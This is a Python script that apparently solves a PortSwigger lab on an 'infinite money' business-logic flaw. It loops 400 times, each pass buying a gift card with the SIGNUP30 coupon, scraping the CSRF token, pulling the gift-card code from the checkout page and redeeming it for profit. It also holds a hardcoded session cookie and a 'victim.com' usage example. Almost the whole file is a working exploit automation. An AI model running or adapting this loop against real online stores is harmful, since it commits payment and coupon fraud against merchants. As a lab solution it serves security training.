# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
# Here we can profit 3$ buying a 10$ coupon with a 30% discount every time

import urllib3
import urllib
import sys
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def logicFlaw(url):

    print("Remember to change the session cookie in the code!")

    cookies = {'session': 'nWzsgc7YXbMhHNxuNb2r7s98oTWOBmbn'}

    for i in range(400):

        # Adding gift card to cart
        cartUrl = url + "/cart"

        r = requests.session()

        params = {
            "productId": "2",
            "redir": "PRODUCT",
            "quantity": "1"
        }

        print("\n[ + ] Adding gift card to cart...")
        addingGiftCardToCart = r.post(cartUrl, verify=False, proxies=proxies, cookies=cookies, data=params, allow_redirects=False)

        
        # Getting csrf
        rAddCoupon = r.get(url, verify=False, proxies=proxies, cookies=cookies)

        soup = BeautifulSoup(rAddCoupon.text, 'html.parser')
        csrf_value = soup.find('input', {'name': 'csrf'}).get('value')

        # Adding discount to checkout

        print("[ + ] Adding coupon on cart")

        couponUrl = url + "/cart/coupon"

        params = {
            "csrf": csrf_value,
            "coupon": "SIGNUP30"
        }

        rAddCoupon = r.post(couponUrl, verify=False, proxies=proxies, cookies=cookies, data=params)

        # Doing checkout

        print("[ + ] Checkouting...")
        checkoutUrl = url + "/cart/checkout"

        params =  {
            "csrf": csrf_value
        }

        rCheckout = r.post(checkoutUrl, verify=False, proxies=proxies, cookies=cookies, data=params)

        # Getting gift-card

        print("[ + ] Getting gift-cards")

        soup = BeautifulSoup(rCheckout.text, 'html.parser')
        td_element = soup.select_one('table.is-table-numbers tbody td')
        coupon = td_element.text.strip()

        # print(coupon_codes)

        # Adding gift-card

        print("[ + ] Adding gift-card to get extra credits")
        giftCardUrl = url + "/gift-card"

        params =  {
                "csrf": csrf_value,
                "gift-card": coupon
            }

        rAddCoupon = r.post(giftCardUrl, verify=False, proxies=proxies, cookies=cookies, data=params)

        print("\nCheck your credit!")

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    logicFlaw(url)

if __name__ == "__main__":
    main() 
